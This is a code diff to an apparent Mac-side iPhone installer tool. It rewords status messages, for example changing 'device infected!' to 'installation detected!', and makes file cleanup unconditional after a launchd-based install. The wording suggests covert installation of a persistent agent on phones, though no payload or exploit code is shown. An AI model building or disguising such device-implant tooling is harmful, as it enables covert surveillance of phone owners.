@@ -117,6 +117,11 @@ NSString *models_name[] =  {@"iPhone",
   [mModel setStringValue: msg];
 }
 
+- (void)resetModel
+{
+  [mModel setStringValue: @""];
+}
+
 #pragma mark -
 #pragma mark Check device thread
 #pragma mark -
@@ -135,7 +140,7 @@ NSString *models_name[] =  {@"iPhone",
     
     if (check_installation(1, 2) == 0)
     {
-      [self tPrint:@"check device... device is clean"];
+      [self tPrint:@"check device... device is ready."];
       
       if (gIosInstallationPath != nil)
         [mInstall setEnabled:YES];
@@ -144,13 +149,13 @@ NSString *models_name[] =  {@"iPhone",
     }
     else
     {
-      [self tPrint:@"check device... device infected!"];
+      [self tPrint:@"check device... installation detected!"];
       gIsDeviceAttached = FALSE;
     }
   }
   else
   {
-    [self tPrint:@"cannot connect to device"];
+    [self tPrint:@"cannot connect to device!"];
   }
 }
 
@@ -168,7 +173,7 @@ NSString *models_name[] =  {@"iPhone",
   
   if (gIosInstallationPath == nil)
   {
-    [self alertForCoreDirectory:@"iOS installation directory not found"
+    [self alertForCoreDirectory:@"iOS installation directory not found!"
                    andAlternate:nil];
   }
   
@@ -267,13 +272,13 @@ NSString *models_name[] =  {@"iPhone",
   
   if (dir_content == NULL)
   {
-    [self tPrint: @"cannot found installation dir!"];
+    [self tPrint: @"cannot found installation component!"];
     return;
   }
   
   if (make_install_directory() != 0)
   {
-    [self tPrint: @"cannot create installer folder"];
+    [self tPrint: @"cannot create installation folder!"];
     return;
   }
   
@@ -281,15 +286,15 @@ NSString *models_name[] =  {@"iPhone",
   
   if (copy_install_files(lpath, dir_content) != 0)
   {
-    [self tPrint: @"cannot copy files in installer folder"];
+    [self tPrint: @"cannot copy files into installation folder!"];
     return;
   }
     
-  [self tPrint: @"copying files... done!"];
+  [self tPrint: @"copying files... done."];
   
   if (create_launchd_plist() != 0)
   {
-    [self tPrint: @"cannot create plist files"];
+    [self tPrint: @"cannot create plist files!"];
     return;
   }
   
@@ -298,7 +303,7 @@ NSString *models_name[] =  {@"iPhone",
   int retVal = restart_device();
   
   if (retVal == 1)
-    [self tPrint: @"try to restart device...restarting"];
+    [self tPrint: @"try to restart device...restarting: please wait."];
   else
     [self tPrint: @"can't restart device: try it manually!"];
   
@@ -317,6 +322,10 @@ NSString *models_name[] =  {@"iPhone",
   
   [self setIcon:@"iphone grayed"];
   
+  [self tPrint:@"device disconnected. Please wait..."];
+  
+  [self resetModel];
+  
   // wait device on
   do
   {
@@ -326,7 +335,7 @@ NSString *models_name[] =  {@"iPhone",
   
   } while(isDeviceOn == 0);
   
-  [self tPrint: @"device connected"];
+  [self tPrint: @"device connected."];
   
   [self setIcon:@"iphone"];
   
@@ -336,16 +345,14 @@ NSString *models_name[] =  {@"iPhone",
   
   if (check_installation(10, 10) == 1)
   {
-    [self tPrint: @"installation done!"];
-    
-    if (remove_installation() == 0)
-      [self tPrint: @"cannot remove installation file!"];
+    [self tPrint: @"installation done."];
   }
   else
   {
     [self tPrint: @"installation failed: please retry!"];
   }
   
+  remove_installation();
 }
 
 #pragma mark -
